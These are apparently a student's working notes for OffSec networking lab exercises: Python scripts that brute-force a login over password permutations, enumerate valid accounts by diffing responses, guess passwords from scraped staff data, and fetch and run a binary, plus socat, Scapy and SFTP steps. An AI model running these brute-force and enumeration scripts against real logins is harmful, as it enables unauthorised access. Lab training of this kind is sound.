# Offsec Networking Labs — Working Notes & Snippets

> Replace all `<TARGET_IP>` with your lab IPs (e.g., `192.168.103.68` or `192.168.112.68`).

---

## HTTP Tasks (Python `requests`)

### 1) POST-only endpoint (`/basic-post`)
```python
#!/usr/bin/python3
import requests

URL = "http://<TARGET_IP>:8080/basic-post/"
r = requests.post(URL, data={"offsec": "hello"})
print(r.text)

2) Simple login with fixed creds (/login-1)

#!/usr/bin/python3
import requests

URL = "http://<TARGET_IP>:8080/login-1/index.php"
payload = {"username": "thobbes", "password": "leviathan"}
r = requests.post(URL, data=payload)
print(r.text)

3) Permutation brute force suffix (/login-2)

Password = "discourse" + a permutation of ! @ # % & (5! = 120).

#!/usr/bin/python3
import itertools, requests

URL = "http://<TARGET_IP>:8080/login-2/index.php"
user = "rdescartes"
chars = "!@#%&"

for p in itertools.permutations(chars):
    pwd = "discourse" + "".join(p)
    r = requests.post(URL, data={"username": user, "password": pwd}, timeout=5, allow_redirects=True)
    if "OS{" in r.text or "Flag" in r.text or "Welcome" in r.text:
        print("Possible working password:", pwd)
        print(r.text[:400])
        break

4) Bijection flag by index (POST only) (/bijection)

Redirects to /bijection/?index=... — requests follows automatically.

#!/usr/bin/python3
import requests, re

URL = "http://<TARGET_IP>:8080/bijection/index.php"
allowed = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}-!@#%&'."

flag = ""
for i in range(0, 200):
    r = requests.post(URL, data={"index": str(i)}, timeout=5, allow_redirects=True)
    body = re.sub(r"<.*?>", "", r.text, flags=re.S)   # strip tags
    chars = [c for c in body if c in allowed]         # keep only valid flag chars
    if not chars:
        print(f"{i} -> (no char)")
        continue
    ch = chars[-1]                                    # last valid char is the index result
    print(f"{i} -> {repr(ch)}")
    flag += ch
    if ch == "}":
        break

print("\nFLAG:", flag)
# Example good output: OS{touche...that's-quite-the-impressive-riposte}

Re-check a single index raw page (punctuation/quotes/periods):

i = 9
r = requests.post(URL, data={"index": str(i)}, timeout=5)
print(r.text)

5) Custom Flag headers across /headers/1..10

#!/usr/bin/python3
import requests

BASE = "http://<TARGET_IP>:8080/headers/{}"
parts = []
for i in range(1, 11):
    r = requests.get(BASE.format(i), timeout=5)
    parts.append(r.headers.get("Flag", ""))
print("FLAG:", "".join(parts))

6) Download binary and execute to print flag (/object)

#!/usr/bin/python3
import os, stat, subprocess, tempfile, requests

URL = "http://<TARGET_IP>:8080/object"
out_path = os.path.join(tempfile.gettempdir(), "oslab.bin")

r = requests.get(URL, timeout=10)
with open(out_path, "wb") as f:
    f.write(r.content)

os.chmod(out_path, os.stat(out_path).st_mode | stat.S_IXUSR)
print(subprocess.check_output([out_path], text=True))

7) Parse /about.html, find valid /login-3 user by response diff

#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

BASE  = "http://<TARGET_IP>:8080"
ABOUT = f"{BASE}/about.html"
LOGIN = f"{BASE}/login-3/index.php"

# Scrape employees: first, last, email, color
rows = []
soup = BeautifulSoup(requests.get(ABOUT, timeout=5).text, "html.parser")
for tr in soup.select("table tbody tr"):
    tds = [td.text.strip() for td in tr.find_all("td")]
    if len(tds) == 4:
        rows.append({"first": tds[0], "last": tds[1], "email": tds[2], "color": tds[3]})

def sig(resp): return f"{resp.status_code}|{len(resp.text)}"
buckets = {}
for r in rows:
    probe = {"username": r["email"], "password": "x"}  # random pw
    res = requests.post(LOGIN, data=probe, timeout=5, allow_redirects=True)
    buckets.setdefault(sig(res), []).append(r)

valid = None
for signature, group in buckets.items():
    if len(group) == 1:
        valid = group[0]
        break

print("Valid account (candidate):", valid)

Build password and try login (friend first name + boss color, twice):
Example if boss is Carly and her color is orange (from /about.html).

#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

BASE  = "http://<TARGET_IP>:8080"
ABOUT = f"{BASE}/about.html"
LOGIN = f"{BASE}/login-3/index.php"

soup = BeautifulSoup(requests.get(ABOUT, timeout=5).text, "html.parser")
rows = []
for tr in soup.select("table tbody tr"):
    tds = [td.text.strip() for td in tr.find_all("td")]
    if len(tds) == 4:
        rows.append({"first": tds[0], "last": tds[1], "email": tds[2], "color": tds[3]})

# find valid account by diffing
def sig(resp): return f"{resp.status_code}|{len(resp.text)}"
buckets = {}
for r in rows:
    res = requests.post(LOGIN, data={"username": r["email"], "password": "x"}, timeout=5, allow_redirects=True)
    buckets.setdefault(sig(res), []).append(r)

for signature, group in buckets.items():
    if len(group) == 1:
        valid = group[0]
        break

by_first = {r["first"]: r for r in rows}
BOSS_FIRST = "Carly"                       # set boss first name (example)
boss_color = by_first[BOSS_FIRST]["color"] # e.g. "orange"

def fmt_name(s): return s[:1].upper() + s[1:].lower()
def fmt_color(s): return s.capitalize()

markers = ("OS{", "Flag", "Welcome")
for friend in rows:
    pwd = f"{fmt_name(friend['first'])}{fmt_color(boss_color)}{fmt_name(friend['first'])}{fmt_color(boss_color)}"
    res = requests.post(LOGIN, data={"username": valid["email"], "password": pwd}, timeout=5, allow_redirects=True)
    if any(m in res.text for m in markers):
        print("SUCCESS:", valid["email"], "PW:", pwd)
        print(res.text[:400])
        break

SOCAT (no EXEC needed)
TCP read (print what server sends)

socat -d -d TCP4:<TARGET_IP>:555 STDOUT
# Example observed: SOCAT{Connected_With_SOCAT}

Listener that shows connection text

socat -v TCP-LISTEN:4444,reuseaddr,fork STDIO
# Example observed when remote connects: SOCAT{TAG_You_Are_It!}

Interactive “shell-like” pass-through

socat -d -d STDIO TCP4:<TARGET_IP>:456

Scapy (send packets) — in-browser Kali

Ping showed reply TTL=61 → Linux default 64 → ~3 hops.
To arrive with TTL 99, set IP TTL to 99 + 3 = 102.

Start Scapy:

sudo scapy

Optionally “prime” the service:

send(IP(dst="<TARGET_IP>")/TCP(dport=9876, sport=22), verbose=0)

1) IP packet that arrives with TTL = 99

send(IP(dst="<TARGET_IP>", ttl=102)/TCP(dport=9876), verbose=0)

2) ICMP with payload “Hello, Offsec!”

send(IP(dst="<TARGET_IP>")/ICMP()/Raw(load=b"Hello, Offsec!"), verbose=0)

3) UDP to port 9876

send(IP(dst="<TARGET_IP>")/UDP(dport=9876, sport=44444)/Raw(load=b"x"), verbose=0)

4) TCP ACK to port 9876, source port 22

send(IP(dst="<TARGET_IP>")/TCP(dport=9876, sport=22, flags="A"), verbose=0)

Retrieve flags via SFTP

sftp offensive@<TARGET_IP>    # password: security
sftp> cd file-transfers
sftp> ls